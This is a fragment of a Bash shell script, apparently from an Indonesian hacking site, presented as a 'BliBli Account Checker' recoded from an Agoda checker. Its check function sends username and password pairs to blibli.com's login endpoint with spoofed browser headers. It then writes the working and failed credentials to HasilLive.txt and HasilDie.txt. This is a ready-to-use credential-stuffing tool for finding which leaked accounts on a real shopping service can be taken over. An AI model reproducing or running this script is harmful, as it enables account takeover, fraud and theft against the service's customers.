...
echo ""
printf "   $WHI ============================================================ \n"
printf "   $GRN                        jago-tekno.com                        \n"
printf "   $WHI ============================================================ \n"
printf "   $YELLOW blibli ACCOUNT CHECKER (Recode dari Agoda acc checker)		 \n"
printf "   $WHI ============================================================ \n"
printf "\n"
printf "   $YELLOW               -BliBli Account Checker-				             \n"
printf "   $ORANGE               Thx AlcSec - AlchaDecode                    \n"
printf "   $WHI ============================================================ \n"
printf "$NC\n"
...
# parameter is blank or null
  ...
  # current folder
  # clear
  ## Recode dari SC agoda Acc Checker milik AlcSec - AlchaDecode
...
check(){
header="`date +%H:%M:%S`"
getc=$(curl -s -c s_cookie.tmp 'https://www.blibli.com/' -H 'authority: www.blibli.com' -H 'upgrade-insecure-requests: 1' -H 'user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/69.0.3497.81 Chrome/69.0.3497.81 Safari/537.36' -H 'accept: application/json, text/plain, */*' -H 'accept-encoding: gzip, deflate, br' -H 'accept-language: en-US,en;q=0.9' --compressed);

login=$(curl -s -b s_cookie.tmp 'https://www.blibli.com//backend/common/users/_login' -H 'origin: https://www.blibli.com' -H 'accept-encoding: gzip, deflate, br' -H 'accept-language: en-US,en;q=0.9' -H 'user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/69.0.3497.81 Chrome/69.0.3497.81 Safari/537.36' -H 'content-type: application/json;charset=UTF-8' -H 'accept: application/json, text/plain, */*' -H 'referer: https://www.blibli.com/' -H 'authority: www.blibli.com' -H 'x-ts-ajax-request: true' --data-binary '{"username":"'$1'","password":"'$2'"}' --compressed);
printf $login;
if [ "$login" == '{"code":401,"status":"UNAUTHORIZED","errors":{"username":["ERROR_LOGIN"]}}' ];then
hasil="[ DIE ] [ ./blibli]";
printf "$RED $hasil $header \n";
echo "$1|$2 - $hasil - $login" >> $3/HasilDie.txt
else
hasil="[ LIVE ] [ ./blibli]";
printf "$GRN $hasil $header\n";
echo "$1|$2 - $hasil - $login" >> $3/HasilLive.txt
fi
}
